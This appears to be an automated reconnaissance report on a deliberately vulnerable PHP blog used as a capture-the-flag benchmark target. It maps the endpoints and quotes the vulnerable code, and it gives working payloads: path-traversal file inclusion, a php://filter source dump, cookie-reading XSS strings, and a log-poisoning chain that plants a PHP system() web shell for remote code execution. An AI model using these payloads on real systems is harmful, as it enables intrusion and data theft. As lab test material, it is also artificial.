# Reconnaissance Deliverable: XBEN-061-24 - Encoder64 Blog Application

## 0) HOW TO READ THIS
This reconnaissance report provides a comprehensive map of the application's attack surface. This is a **PHP 7.4 blog application with NO authentication system** - all endpoints are publicly accessible without credentials.

**Key Findings Overview:**
- **Zero authentication/authorization controls** - completely open access to all functionality
- **Critical Local File Inclusion (LFI)** vulnerability in post viewer endpoint
- **File-based storage only** - no database, sessions, or cookies
- **Minimal input validation** - only basic trim() and empty() checks
- **Multiple XSS vectors** in contact form submission

**Critical Attack Surface Areas:**
- **Section 4 (API Endpoint Inventory):** All 4 endpoints are unauthenticated; post.php has critical LFI vulnerability
- **Section 5 (Potential Input Vectors):** Focus on `$_GET['id']` in post.php (LFI) and `$_POST` fields in contact.php (XSS)
- **Section 9 (Injection Sources):** Primary attack vector is LFI through post.php?id parameter leading to FLAG disclosure

**Priority Order for Testing:** 
1. Exploit LFI in post.php to access FLAG.php (CTF win condition)
2. Test XSS vectors in contact form
3. Attempt log poisoning for RCE via LFI + writable Apache logs

**No Authorization Testing Required:** This application has no authentication system, no user roles, no sessions, and no access controls. All "Authorization Vulnerability Candidates" sections (8.1-8.3) are marked as NOT APPLICABLE.

## 1. Executive Summary

The XBEN-061-24 application is a **PHP 7.4-based blog platform** running on **Apache 2.4.54 (Debian)** within a Docker container, exposed on **port 45447**. This is a Capture The Flag (CTF) challenge application that presents a **CRITICAL security risk** due to multiple severe vulnerabilities and **complete absence of security controls**.

**Core Technology Stack:**
- **Frontend:** HTML5, Bootstrap 5.3.0 (CDN), vanilla JavaScript
- **Backend:** PHP 7.4.33 (EOL November 2022), Apache 2.4.54
- **Storage:** File-based (JSON + PHP files) - no database
- **Infrastructure:** Docker container, no reverse proxy, no WAF

**Primary User-Facing Components:**
1. Blog homepage with pagination (`index.php`)
2. Individual post viewer (`post.php`) - **CRITICAL LFI vulnerability**
3. Contact form (`contact.php`) - **XSS vulnerabilities**
4. About page (`about.php`) - static content

**Application Purpose:** A simple blog platform displaying cybersecurity-themed articles. The blog showcases posts about EternalBlue exploit, machine learning, cybersecurity importance, blockchain, renewable energy, and AI. No actual blogging functionality (no post creation, editing, or user management).

**Security Posture - CRITICAL DEFICIENCIES:**
- ❌ **No authentication or authorization** - all endpoints publicly accessible
- ❌ **No session management** - completely stateless with no user tracking
- ❌ **Critical LFI vulnerability** - unauthenticated access to arbitrary files including FLAG.php
- ❌ **Multiple XSS vulnerabilities** - unencoded user input in contact form
- ❌ **Hardcoded secrets** - FLAG committed to .env file and embedded in container
- ❌ **Outdated PHP** (7.4.33) - reached End of Life, no security patches
- ❌ **World-writable Apache log** (chmod 0777) - enables log poisoning attacks
- ❌ **No security headers** - missing CSP, X-Frame-Options, HSTS, etc.
- ❌ **No input validation framework** - only minimal trim() and empty() checks
- ❌ **No CSRF protection** - forms lack anti-CSRF tokens

**Attack Surface Summary:**
- **Total Network-Accessible Endpoints:** 4 PHP files
- **Authenticated Endpoints:** 0 (none)
- **Critical Vulnerability Endpoints:** 2 (post.php - LFI, contact.php - XSS)
- **Primary Attack Vector:** Path traversal through LFI to read FLAG.php
- **Secondary Attack Vector:** Log poisoning + LFI for Remote Code Execution

**Risk Assessment:** **CRITICAL** - Multiple pathways to complete compromise with trivial exploitation complexity. The primary CTF objective (FLAG disclosure) is achievable through a single HTTP request: `GET /post.php?id=../../FLAG.php`

## 2. Technology & Service Map

### Frontend
- **Framework:** Vanilla HTML5 with Bootstrap 5.3.0
- **CSS Framework:** Bootstrap 5.3.0 (loaded from cdn.jsdelivr.net)
- **JavaScript:** Bootstrap bundle 5.3.0 (CDN), custom sidebar.php JavaScript for fake "live visitors" counter
- **Client-Side Libraries:** None beyond Bootstrap
- **Security Issues:** 
  - No Subresource Integrity (SRI) hashes on CDN resources
  - No Content Security Policy (CSP)
  - Vulnerable to CDN compromise attacks

### Backend
- **Language:** PHP 7.4.33 (Non-Thread Safe)
- **Build Date:** November 15, 2022 (final release before EOL)
- **Zend Engine:** v3.4.0
- **Total Lines of Code:** 519 lines across 10 PHP files
- **Framework:** None - custom vanilla PHP
- **Key Dependencies:** None (no composer.json)
- **Security Configuration Issues:**
  - `short_open_tag`: ON (allows `<? ?>` syntax, increases attack surface)
  - `allow_url_fopen`: ON (**CRITICAL** - remote file operations enabled)
  - `allow_url_include`: OFF (mitigates RFI but not LFI)
  - `display_errors`: ON (**HIGH** - information disclosure to attackers)
  - `disable_functions`: empty (**CRITICAL** - no PHP function blacklist)
  - `open_basedir`: empty (**CRITICAL** - no filesystem restrictions)
  - `max_execution_time`: 0 (unlimited - resource exhaustion risk)

### Infrastructure
- **Web Server:** Apache 2.4.54 (Debian) - Built June 9, 2022
- **Hosting:** Docker container (xben-061-24_web_1)
- **Base Image:** php:7.4-apache
- **Container Network:** Bridge network (10.89.4.2)
- **Exposed Port:** 45447:80 (host:container mapping)
- **CDN:** jsdelivr.net (for Bootstrap assets)
- **Reverse Proxy:** None - Apache directly exposed
- **WAF:** None - mod_security not installed
- **Rate Limiting:** None - mod_evasive not installed
- **Health Check:** Curl to http://127.0.0.1:80/ every 10 seconds

### Identified Subdomains
From subfinder scan (all resolve to localhost):
- naeu2.naeuinc.localhost
- server02.counterintel.localhost
- mail02.regency.localhost
- owa.regency.localhost
- sbs.allsaintsschool.localhost
- server2.hunter.localhost
- tools.sonoma.edu.localhost
- www.localhost
- fndlync01.5ninesdata.localhost
- mse-ca-mail.corp.mse.localhost
- autodiscover.regency.localhost
- mail03.regency.localhost
- mail.regency.localhost
- autodiscover.localhost
- exchvm.nwcnet.localhost
- mail.localhost

**Note:** These subdomains are part of the local test environment setup and all resolve to the same application instance. They are not separate attack surfaces.

### Open Ports & Services
From nmap scan:

| Port | State | Service | Version | Purpose |
|------|-------|---------|---------|---------|
| 80/tcp | open | http | Caddy httpd | Reverse proxy (not directly used by app) |
| 443/tcp | open | ssl/https | - | HTTPS (not configured for app) |
| 631/tcp | open | ipp | CUPS 2.3 | Print server (out of scope) |
| 8888/tcp | open | http | SimpleHTTPServer 0.6 (Python 3.12.10) | Git repository exposure |
| 9999/tcp | open | tcpwrapped | - | Unknown service |
| 45447/tcp | **TARGET** | http | Apache 2.4.54 | **Main application** |
| 49152/tcp | open | http | Golang net/http | Tailscale (401 auth required) |

**Primary Target:** Port 45447 running Apache 2.4.54 serving the PHP application

## 3. Authentication & Session Management Flow

### Authentication Mechanism: **NOT IMPLEMENTED**

**CRITICAL FINDING:** This application has **ZERO authentication infrastructure** of any kind.

**Evidence of Absence:**
- ✗ No `session_start()` calls in any PHP file
- ✗ No `$_SESSION` variable usage
- ✗ No `setcookie()` or cookie management
- ✗ No `$_COOKIE` references
- ✗ No `password_hash()` or `password_verify()` functions
- ✗ No login/logout endpoints
- ✗ No user registration functionality
- ✗ No database for credential storage
- ✗ No JWT, OAuth, OIDC, or SSO integration
- ✗ No HTTP Basic Auth or Digest Auth
- ✗ No .htaccess password protection

**Search Results:**
Comprehensive grep searches for authentication keywords returned **0 matches** in application code:
- `login`, `logout`, `authenticate`, `authorization` - 0 matches
- `session_start`, `$_SESSION` - 0 matches
- `password_hash`, `password_verify`, `bcrypt` - 0 matches
- `token`, `jwt`, `bearer` - 0 matches

**Entry Points:** None - no login endpoints exist

**Security Implication:** The complete absence of authentication means that **ALL vulnerabilities are exploitable by unauthenticated external attackers** without any credentials. This dramatically increases the severity of every finding. There are no privileged operations to escalate to because all operations are already at maximum public access level.

### 3.1 Role Assignment Process: **NOT APPLICABLE**

**Role Determination:** No roles exist - all users have identical anonymous access

**Default Role:** Anonymous (unauthenticated) - the only role

**Role Upgrade Path:** Not applicable - no role hierarchy

**Code Implementation:** No role assignment logic exists

### 3.2 Privilege Storage & Validation: **NOT APPLICABLE**

**Storage Location:** No privileges are stored

**Validation Points:** No role checks exist in any endpoint

**Cache/Session Persistence:** No sessions or persistence mechanisms

**Code Pointers:** No privilege validation code exists

### 3.3 Role Switching & Impersonation: **NOT APPLICABLE**

**Impersonation Features:** None

**Role Switching:** None

**Audit Trail:** No logging of user actions or role changes

**Code Implementation:** No impersonation features exist

## 4. API Endpoint Inventory

**Network Surface Focus:** All endpoints listed below are network-accessible through HTTP on port 45447. This application has no local-only utilities, CLI tools, or build scripts in the web attack surface.

| Method | Endpoint Path | Required Role | Object ID Parameters | Authorization Mechanism | Description & Code Pointer |
|--------|---------------|---------------|----------------------|-------------------------|----------------------------|
| GET | `/` or `/index.php` | anon | `page` (integer, pagination) | None | Homepage displaying blog post list with pagination. Reads posts.json via file_get_contents() (line 3). Safe integer casting on page parameter (line 10). Uses htmlspecialchars() for output (lines 48-52). **Location:** `/app/website/index.php` |
| GET | `/post.php` | anon | `id` (string, filename) | None | **CRITICAL VULNERABILITY:** Individual post viewer with Local File Inclusion. Takes user input `$_GET['id']` with NO validation (line 4), concatenates to path (line 8), and includes file (line 11). Can read arbitrary files including `/FLAG.php`. Error reporting disabled (line 2). **Location:** `/app/website/post.php` |
| GET, POST | `/contact.php` | anon | `name`, `email`, `message` (POST strings) | None | Contact form with basic validation. Accepts name, email, message fields via POST. Only validates empty() and trim() - no htmlspecialchars() on output (lines 66, 71, 76). **XSS vulnerability.** No data storage or email sending. **Location:** `/app/website/contact.php` |
| GET | `/about.php` | anon | None | None | Static about page with information about "Encoder64" persona. No user input, no dynamic content. Safe. **Location:** `/app/website/about.php` |
| GET | `/posts.json` | anon | None | None | Static JSON file served by Apache containing blog post metadata (6 posts). Information disclosure - reveals valid post filenames for LFI exploitation. **Location:** `/app/website/posts.json` |
| GET | `/static/images/*.webp` | anon | None | None | Static image assets served by Apache. Blog post images in WebP format. No security issues. **Location:** `/app/website/static/images/` |
| GET (indirect) | `/posts/*.php` | anon | None | None (accessed via LFI) | 6 blog post content files: EternalBlue.php, Introduction-to-Machine-Learning.php, The-Importance-of-Cybersecurity.php, Advances-in-Renewable-Energy.php, Blockchain-Technology.php, Future-of-AI.php. Each defines $post_title, $post_brief, $post_content variables. Accessed via post.php include(). **Location:** `/app/website/posts/` |
| GET (indirect) | `/include/navigation-bar.php` | anon | None | None (server-side include) | Navigation menu component included by all main pages. Hardcoded HTML with links to index, about, contact pages. Uses short PHP tag `<?`. **Location:** `/app/website/include/navigation-bar.php` |
| GET (indirect) | `/include/sidebar.php` | anon | None | None (server-side include) | Sidebar component with non-functional search widget, category links, and JavaScript-generated fake "live visitors" counter. Client-side only, no security issues. **Location:** `/app/website/include/sidebar.php` |

**Note on Authorization:** ALL endpoints are publicly accessible without authentication. There is no concept of "Required Role" beyond anonymous access, and no authorization mechanisms exist. The "Object ID Parameters" column identifies parameters that reference objects, but no ownership or permission checks are performed.

**Critical Endpoint Details:**

### `/post.php` - PRIMARY ATTACK VECTOR
```php
// Line 2: Suppress errors
error_reporting(0);

// Line 4: NO VALIDATION
$post_id = $_GET['id'];

// Line 8: Direct concatenation
$file_to_include = $posts_path . $post_id;

// Line 11: DANGEROUS - arbitrary file inclusion
include($file_to_include);
```

**Exploitation:** `GET /post.php?id=../../FLAG.php` bypasses intended "posts/" directory and includes FLAG file from container root.

### `/contact.php` - XSS VECTORS
```php
// Line 66: No htmlspecialchars()
<input type="text" name="name" class="form-control" value="<?php echo $name; ?>">

// Line 71: No htmlspecialchars()
<input type="email" name="email" class="form-control" value="<?php echo $email; ?>">

// Line 76: No htmlspecialchars()
<textarea name="message" class="form-control"><?php echo $message; ?></textarea>
```

**Exploitation:** Submit form with `<script>alert(document.cookie)</script>` in any field.

## 5. Potential Input Vectors for Vulnerability Analysis

**Network Surface Focus:** All input vectors listed below are accessible through the application's HTTP interface on port 45447. No local-only scripts or CLI inputs are included.

### URL Parameters

#### 5.1 CRITICAL: Local File Inclusion (LFI) Vector
**File:** `/app/website/post.php:4`
```php
$post_id = $_GET['id'];
```
**Parameter Name:** `id`
**Data Type:** String (unvalidated)
**Validation Applied:** NONE - direct assignment
**Sanitization Applied:** NONE - no basename(), realpath(), or whitelist
**Dangerous Sink:** Line 11 - `include($file_to_include)`
**Exploitation:** Path traversal via `../` sequences
**Example Payloads:**
- `?id=../../FLAG.php` - Access CTF flag
- `?id=../../../../etc/passwd` - System file disclosure
- `?id=../../../../var/log/apache2/access.log` - Log poisoning for RCE
- `?id=php://filter/convert.base64-encode/resource=index.php` - Source code disclosure

#### 5.2 Pagination Parameter (Safe)
**File:** `/app/website/index.php:10`
```php
$page = isset($_GET['page']) ? (int)$_GET['page'] : 1;
```
**Parameter Name:** `page`
**Data Type:** Integer (type cast)
**Validation Applied:** Type casting to (int)
**Sanitization Applied:** Automatic via type conversion
**Usage:** Lines 13-14 for pagination calculation, line 61 for page links
**Risk Level:** LOW - properly validated via type casting

### POST Body Fields (JSON/Form)

#### 5.3 Contact Form - Name Field (XSS)
**File:** `/app/website/contact.php:9-12`
```php
if(empty(trim($_POST["name"]))){
    $name_err = "Please enter your name.";
} else{
    $name = trim($_POST["name"]);
}
```
**Parameter Name:** `name`
**Data Type:** String
**Validation Applied:** empty(trim()) - only checks if blank
**Sanitization Applied:** trim() only - removes whitespace
**Dangerous Sink:** Line 66 - `<input value="<?php echo $name; ?>">`
**Exploitation:** Inject `"><script>alert(1)</script>` to break out of attribute and execute JavaScript
**Missing Controls:** htmlspecialchars(), strip_tags(), length limits

#### 5.4 Contact Form - Email Field (XSS + No Format Validation)
**File:** `/app/website/contact.php:16-19`
```php
if(empty(trim($_POST["email"]))){
    $email_err = "Please enter your email address.";
} else{
    $email = trim($_POST["email"]);
}
```
**Parameter Name:** `email`
**Data Type:** String
**Validation Applied:** empty(trim()) - only checks if blank
**Sanitization Applied:** trim() only
**Dangerous Sink:** Line 71 - `<input value="<?php echo $email; ?>">`
**Exploitation:** Inject `test@test.com"><script>alert(1)</script>`
**Missing Controls:** htmlspecialchars(), filter_var($email, FILTER_VALIDATE_EMAIL), email format regex

#### 5.5 Contact Form - Message Field (XSS)
**File:** `/app/website/contact.php:23-26`
```php
if(empty(trim($_POST["message"]))){
    $message_err = "Please enter your message.";
} else{
    $message = trim($_POST["message"]);
}
```
**Parameter Name:** `message`
**Data Type:** String
**Validation Applied:** empty(trim()) - only checks if blank
**Sanitization Applied:** trim() only
**Dangerous Sink:** Line 76 - `<textarea><?php echo $message; ?></textarea>`
**Exploitation:** Inject `</textarea><script>alert(document.cookie)</script>` to break out of textarea and execute JavaScript
**Missing Controls:** htmlspecialchars(), strip_tags(), length limits

### HTTP Headers

#### 5.6 PHP_SELF in Form Action (Safe)
**File:** `/app/website/contact.php:63`
```php
<form action="<?php echo htmlspecialchars($_SERVER["PHP_SELF"]); ?>" method="post">
```
**Parameter Name:** `$_SERVER["PHP_SELF"]`
**Data Type:** String (server variable)
**Validation Applied:** None
**Sanitization Applied:** htmlspecialchars() on output
**Risk Level:** LOW - properly sanitized
**Note:** $_SERVER["PHP_SELF"] can be manipulated but is protected here

#### 5.7 Request Method Check (Safe)
**File:** `/app/website/contact.php:7`
```php
if($_SERVER["REQUEST_METHOD"] == "POST"){
```
**Parameter Name:** `$_SERVER["REQUEST_METHOD"]`
**Usage:** Control flow for form processing
**Risk Level:** LOW - safe usage pattern

### Cookie Values
**Finding:** NO `$_COOKIE` usage found in any PHP file
**Search Results:** 0 matches across entire codebase
**Implication:** No cookie-based input vectors exist

### File Uploads
**Finding:** NO `$_FILES` usage found in any PHP file
**Search Results:** 0 matches across entire codebase
**Implication:** No file upload functionality or vectors

### JSON/XML Input

#### 5.8 JSON File Reading (Safe)
**File:** `/app/website/index.php:3-4`
```php
$json_data = file_get_contents('posts.json');
$posts = json_decode($json_data, true);
```
**Data Source:** Local file (posts.json) - not user input
**Usage:** Display blog post listings with htmlspecialchars() (lines 48-52)
**Risk Level:** LOW - file is static, output is properly encoded
**Note:** If attacker gains write access to posts.json, could inject XSS payloads

### Summary of Input Vectors by Risk

| Risk Level | Vector | Location | Vulnerability Type |
|------------|--------|----------|-------------------|
| **CRITICAL** | `$_GET['id']` | post.php:4 | Local File Inclusion → RCE |
| **HIGH** | `$_POST['name']` | contact.php:12 | Reflected XSS |
| **HIGH** | `$_POST['email']` | contact.php:19 | Reflected XSS + No format validation |
| **HIGH** | `$_POST['message']` | contact.php:26 | Reflected XSS |
| **LOW** | `$_GET['page']` | index.php:10 | Safe - integer cast |
| **LOW** | `$_SERVER['PHP_SELF']` | contact.php:63 | Safe - htmlspecialchars() applied |

**Total Input Vectors:** 6 (1 CRITICAL, 3 HIGH, 2 LOW)
**Total Dangerous Sinks:** 4 (1 include(), 3 echo without encoding)

## 6. Network & Interaction Map

**Network Surface Focus:** This map represents only the deployed, network-accessible infrastructure on port 45447. Local development tools, build systems, and out-of-scope services are excluded.

### 6.1 Entities

| Title | Type | Zone | Tech | Data | Notes |
|-------|------|------|------|------|-------|
| External User | ExternAsset | Internet | Browser | None | Anonymous external attacker with no credentials |
| Encoder64 Blog App | Service | App | PHP 7.4.33/Apache 2.4.54 | PII, Secrets (FLAG) | Main application backend - monolithic architecture |
| Apache Web Server | Service | App | Apache 2.4.54 (Debian) | Public | Serves PHP application and static assets |
| Filesystem Storage | DataStore | App | Linux filesystem | PII, Secrets (FLAG), Blog Content | posts.json, *.php files, /FLAG.php |
| Apache Access Log | DataStore | App | Text file (0777 perms) | HTTP Requests, User-Agents | World-writable log at /var/log/apache2/access.log - RCE vector |
| Bootstrap CDN | ThirdParty | Internet | jsdelivr.net CDN | Public | Serves Bootstrap 5.3.0 CSS/JS - no SRI hashes |
| Docker Container | AdminPlane | App | Docker (php:7.4-apache) | All app data | Container runtime environment |

### 6.2 Entity Metadata

| Title | Metadata |
|-------|----------|
| Encoder64 Blog App | Hosts: `http://localhost:45447`; Endpoints: `/index.php`, `/post.php`, `/contact.php`, `/about.php`, `/posts.json`, `/static/*`; Auth: None; Dependencies: Filesystem Storage, Apache Access Log; Container: xben-061-24_web_1; Network: Bridge (10.89.4.2); PHP Version: 7.4.33 (EOL); Total LOC: 519 lines |
| Apache Web Server | Version: `2.4.54 (Debian)`; Built: 2022-06-09; Modules: mod_rewrite, mod_php7, access_compat, authz_host, deflate, setenvif; Missing: mod_security, mod_evasive; Process Owner: www-data; Port: 80 (container), 45447 (host); Document Root: /var/www/html |
| Filesystem Storage | Location: `/var/www/html/`; Files: posts.json (644), posts/*.php (644), include/*.php (644), static/images/*.webp; Flag Location: `/FLAG.php` (container root); Permissions: www-data:www-data; Encryption: None (plaintext); Database: None - file-based only |
| Apache Access Log | Path: `/var/log/apache2/access.log`; Permissions: `0777` (world-writable); Owner: www-data:www-data; Format: Apache Common Log Format (CLF); Rotation: None; Sanitization: None - User-Agent logged verbatim; RCE Vector: Yes - inject PHP via User-Agent, include via LFI |
| Bootstrap CDN | URL: `https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/`; Files: bootstrap.min.css, bootstrap.bundle.min.js; SRI Hashes: Missing (security risk); Fallback: None; CORS: Permissive; Risk: CDN compromise or MITM could inject malicious code |
| Docker Container | ID: xben-061-24_web_1; Base: php:7.4-apache; Build ARG: FLAG (persisted in image layers); Network Mode: bridge; Port Mapping: 45447:80; Health Check: curl -f http://127.0.0.1:80/ (10s interval); Resource Limits: None; Security Options: None (no no-new-privileges, no read-only fs) |

### 6.3 Flows (Connections)

| FROM → TO | Channel | Path/Port | Guards | Touches |
|-----------|---------|-----------|--------|---------|
| External User → Encoder64 Blog App | HTTP | `:45447 /index.php` | None | Public |
| External User → Encoder64 Blog App | HTTP | `:45447 /post.php?id=*` | None | PII, Secrets (via LFI) |
| External User → Encoder64 Blog App | HTTP | `:45447 /contact.php` | None | PII |
| External User → Encoder64 Blog App | HTTP | `:45447 /about.php` | None | Public |
| External User → Bootstrap CDN | HTTPS | `:443 cdn.jsdelivr.net` | None | Public |
| Encoder64 Blog App → Filesystem Storage | File I/O | `read: posts.json, posts/*.php` | None | Blog Content |
| Encoder64 Blog App → Filesystem Storage | File I/O | `include: $_GET['id']` | None (LFI) | Secrets, System Files |
| Encoder64 Blog App → Apache Access Log | File I/O | `write: /var/log/apache2/access.log` | None (0777) | HTTP Requests, User-Agents |
| Apache Web Server → Encoder64 Blog App | Process | `mod_php7 execution` | None | All data |
| Docker Container → Filesystem Storage | Filesystem | `/var/www/html/`, `/FLAG.php` | None | All app data |

### 6.4 Guards Directory

| Guard Name | Category | Statement |
|------------|----------|-----------|
| None | Auth | No authentication guards exist in this application - all access is anonymous |
| None | Authorization | No authorization guards exist - all endpoints are publicly accessible |
| None | Network | Application directly exposed on port 45447 with no firewall or IP allowlist |
| None | Protocol | No mTLS, certificate validation, or encryption verification |
| None | RateLimit | No rate limiting on any endpoint - unlimited requests allowed |
| None | CSRF | No CSRF tokens on forms - cross-site request forgery possible |
| None | Input Validation | No input validation framework - only ad-hoc trim() and empty() checks |

**CRITICAL SECURITY OBSERVATION:** This application implements **ZERO security guards**. There are no authentication checks, no authorization validations, no rate limits, no CSRF protection, no input validation framework, and no network-level restrictions. Every endpoint is completely open to anonymous external attackers.

## 7. Role & Privilege Architecture

### APPLICATION HAS NO ROLE/PRIVILEGE SYSTEM

This section is **NOT APPLICABLE** because the application implements **zero authentication and authorization infrastructure**. There is no concept of users, roles, privileges, or access control in this application.

### 7.1 Discovered Roles: **NONE**

**Only "Role":** Anonymous (unauthenticated public access)

| Role Name | Privilege Level | Scope/Domain | Code Implementation |
|-----------|-----------------|--------------|---------------------|
| anonymous | 0 (public) | Global | No authentication required - default for all access |

**Evidence:** No role definitions, no permission checks, no user management code exists in any PHP file.

### 7.2 Privilege Lattice: **NOT APPLICABLE**

**Privilege Ordering:** Only one privilege level exists (anonymous/public)

```
No hierarchy exists - all access is at the same level:

anonymous (public) - all users have identical access
```

**Note:** No role switching, impersonation, or privilege escalation mechanisms exist because there are no roles to switch between.

### 7.3 Role Entry Points: **NOT APPLICABLE**

**All users access the same entry points:**

| Role | Default Landing Page | Accessible Route Patterns | Authentication Method |
|------|---------------------|---------------------------|----------------------|
| anonymous | `/` or `/index.php` | All routes: `/`, `/index.php`, `/post.php`, `/contact.php`, `/about.php`, `/posts.json`, `/static/*` | None |

### 7.4 Role-to-Code Mapping: **NOT APPLICABLE**

No middleware, guards, or permission checks exist in the codebase. All endpoints execute without any authorization verification.

## 8. Authorization Vulnerability Candidates

### APPLICATION HAS NO AUTHORIZATION SYSTEM

All sections below (8.1, 8.2, 8.3) are marked as **NOT APPLICABLE** because this application has **zero authentication and authorization controls**. There is no concept of users, roles, object ownership, or access permissions.

### 8.1 Horizontal Privilege Escalation Candidates: **NOT APPLICABLE**

**Reason:** No user accounts exist. All data is public. There is no concept of "other users' resources" because there are no users.

**Table:** Empty - no endpoints with ownership checks exist.

| Priority | Endpoint Pattern | Object ID Parameter | Data Type | Sensitivity |
|----------|------------------|---------------------|-----------|-------------|
| N/A | No horizontal authorization boundaries exist | N/A | N/A | All data is public |

### 8.2 Vertical Privilege Escalation Candidates: **NOT APPLICABLE**

**Reason:** No role hierarchy exists. All access is at the same anonymous/public level. There are no higher-privilege endpoints or administrative functions.

**Table:** Empty - no admin or elevated-privilege endpoints exist.

| Target Role | Endpoint Pattern | Functionality | Risk Level |
|-------------|------------------|---------------|------------|
| N/A | No role hierarchy exists | N/A | N/A |

**Note:** While the application lacks authorization, the FLAG file represents "privileged" data in the CTF context. However, this is protected by obscurity (location /FLAG.php), not authorization controls. The LFI vulnerability bypasses this obscurity.

### 8.3 Context-Based Authorization Candidates: **NOT APPLICABLE**

**Reason:** No multi-step workflows or stateful processes exist. The application is completely stateless with no session management.

**Table:** Empty - no workflow state validation exists.

| Workflow | Endpoint | Expected Prior State | Bypass Potential |
|----------|----------|----------------------|------------------|
| N/A | No stateful workflows exist | N/A | N/A |

**Note:** The contact form (`/contact.php`) does not enforce any workflow state and accepts submissions directly without prior steps or tokens.

### Summary: Authorization Testing Not Required

This application requires **NO authorization vulnerability testing** because it has no authorization system to test. The primary vulnerability class is **unauthenticated access to sensitive data** via the Local File Inclusion (LFI) vulnerability, which is covered in Section 9 (Injection Sources).

## 9. Injection Sources (Command Injection, SQL Injection, LFI/RFI, SSTI, Path Traversal, Deserialization)

**Network Surface Focus:** All injection sources listed below are accessible through HTTP requests to port 45447. No local-only scripts or CLI inputs are included.

### CRITICAL FINDING: Local File Inclusion (LFI) - PRIMARY ATTACK VECTOR

**Injection Type:** Local File Inclusion (LFI) with Path Traversal

**Location:** `/app/website/post.php`

**Complete Data Flow Path:**

1. **Source (Line 4):** User-controllable input from URL parameter
```php
$post_id = $_GET['id'];
```

2. **Processing (Line 6-8):** Direct concatenation with NO validation
```php
$posts_path = "posts/";
// NO sanitization applied
$file_to_include = $posts_path . $post_id;
```

3. **Validation Check (Line 10):** Insufficient - file_exists() does not prevent path traversal
```php
if (file_exists($file_to_include)) {
```

4. **Dangerous Sink (Line 11):** include() executes arbitrary file as PHP code
```php
    include($file_to_include);
}
```

**Missing Security Controls:**
- ❌ No `basename()` to strip directory components
- ❌ No `realpath()` to resolve symbolic links and `../` sequences
- ❌ No whitelist validation against allowed post filenames
- ❌ No blacklist of dangerous sequences (`../`, `..\\`, `%00`)
- ❌ No file extension validation (.php only)
- ❌ No `open_basedir` PHP configuration directive
- ❌ Error reporting disabled (line 2: `error_reporting(0)`) hides warnings

**Why file_exists() is Insufficient:**
- `file_exists()` checks if a path is valid, NOT if it's within the intended directory
- Path traversal sequences are processed BEFORE the existence check
- Example: `file_exists("posts/../../FLAG.php")` resolves to `/FLAG.php` and returns TRUE
- No `open_basedir` restriction allows access to any file readable by www-data user

**Exploitation Vectors:**

1. **Path Traversal - Access FLAG (CTF Win Condition)**
```
GET /post.php?id=../../FLAG.php
```
**Result:** Discloses FLAG stored in `/FLAG.php` at container root

2. **System File Disclosure**
```
GET /post.php?id=../../../../etc/passwd
GET /post.php?id=../../../../etc/hostname
```
**Result:** Reads system configuration files

3. **PHP Filter Wrapper - Source Code Disclosure**
```
GET /post.php?id=php://filter/convert.base64-encode/resource=../index.php
```
**Result:** Reads and base64-encodes source code of any PHP file

4. **Log Poisoning → Remote Code Execution**
```
Step 1: Poison log with PHP payload in User-Agent header
curl -A "<?php system(\$_GET['cmd']); ?>" http://localhost:45447/

Step 2: Include poisoned log via LFI
GET /post.php?id=../../../../var/log/apache2/access.log&cmd=cat /FLAG.php

Step 3: RCE achieved - can execute arbitrary commands
```
**Result:** Remote Code Execution (RCE) with www-data user privileges

**Exploitability:** CRITICAL
- No authentication required
- Single HTTP request achieves objective
- Trivial to exploit - no complex payload construction needed
- Direct access to FLAG file

**Impact:**
- CTF flag disclosure (primary objective)
- Complete source code disclosure
- System information disclosure
- Remote Code Execution via log poisoning
- Potential container escape vectors

---

### HIGH FINDING: Reflected XSS in Contact Form (3 vectors)

**Injection Type:** Cross-Site Scripting (XSS) - Reflected

**Locations:** `/app/website/contact.php` (3 separate injection points)

#### XSS Vector 1: Name Field

**Complete Data Flow Path:**

1. **Source (Line 12):** User input from POST body
```php
$name = trim($_POST["name"]);
```

2. **Processing:** Only whitespace trimming - NO encoding
```php
// Line 9: Only validates empty
if(empty(trim($_POST["name"]))){
```

3. **Dangerous Sink (Line 66):** Direct output without htmlspecialchars()
```php
<input type="text" name="name" class="form-control" value="<?php echo $name; ?>">
```

**Exploitation:**
```
POST /contact.php
name="><script>alert(document.cookie)</script>
```

#### XSS Vector 2: Email Field

**Complete Data Flow Path:**

1. **Source (Line 19):** User input from POST body
```php
$email = trim($_POST["email"]);
```

2. **Processing:** Only whitespace trimming - NO encoding, NO email format validation
```php
// Line 16: Only validates empty
if(empty(trim($_POST["email"]))){
```

3. **Dangerous Sink (Line 71):** Direct output without htmlspecialchars()
```php
<input type="email" name="email" class="form-control" value="<?php echo $email; ?>">
```

**Exploitation:**
```
POST /contact.php
email=test@test.com"><script>alert(1)</script>
```

**Additional Issue:** No email format validation despite HTML5 type="email" (client-side only, easily bypassed)

#### XSS Vector 3: Message Field

**Complete Data Flow Path:**

1. **Source (Line 26):** User input from POST body
```php
$message = trim($_POST["message"]);
```

2. **Processing:** Only whitespace trimming - NO encoding
```php
// Line 23: Only validates empty
if(empty(trim($_POST["message"]))){
```

3. **Dangerous Sink (Line 76):** Direct output inside textarea without htmlspecialchars()
```php
<textarea name="message" class="form-control"><?php echo $message; ?></textarea>
```

**Exploitation:**
```
POST /contact.php
message=</textarea><script>alert(document.cookie)</script>
```

**Missing Security Controls (All 3 Vectors):**
- ❌ No `htmlspecialchars()` or `htmlentities()` on output
- ❌ No `strip_tags()` to remove HTML
- ❌ No Content Security Policy (CSP) header
- ❌ No input length limits
- ❌ No character whitelist enforcement
- ❌ No XSS detection or filtering

**Exploitability:** HIGH (but lower than LFI)
- Reflected XSS requires victim interaction
- No session cookies to steal (application has no sessions)
- Could be used for phishing, defacement, or credential harvesting
- Combined with social engineering, could compromise users

**Impact:**
- JavaScript execution in victim browser
- DOM manipulation
- Keylogging potential
- Phishing attacks
- No session hijacking (no sessions exist)

---

### ADDITIONAL FINDING: Secondary XSS Vector in Post Content

**Injection Type:** Stored/Second-Order XSS (requires file write access)

**Location:** `/app/website/post.php:50`

**Data Flow:**
```php
<?= $post_content; ?>
```

**Risk:** If an attacker can modify post PHP files (via LFI write or other means), they can inject arbitrary HTML/JavaScript into `$post_content` variable, which is echoed without sanitization.

**Current Status:** LOW risk - post files are static and not user-modifiable through the application. However, if combined with a file upload or write vulnerability, this becomes HIGH risk.

---

### NOT FOUND: SQL Injection

**Reason:** Application uses **NO database**. All data stored in flat JSON and PHP files.

**Evidence:**
- ✓ Searched for `mysqli_query`, `mysql_query`, `PDO::`, `prepare()`, `query()`
- ✓ Result: 0 matches in application code
- ✓ No database connection configuration
- ✓ No SQL statements anywhere in codebase

